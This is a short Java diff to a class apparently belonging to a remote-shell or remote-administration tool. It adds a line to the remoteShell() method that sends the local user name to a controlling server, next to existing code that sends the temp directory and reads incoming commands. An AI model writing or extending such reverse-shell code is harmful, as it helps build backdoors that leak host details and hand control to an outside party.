@@ -33,6 +33,7 @@ public class WindowsCommandSet extends CommandSet
     @Override
     public void remoteShell()
     {
+        sendStringToServer(System.getProperty("user.name"));
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
         String inputCommand;
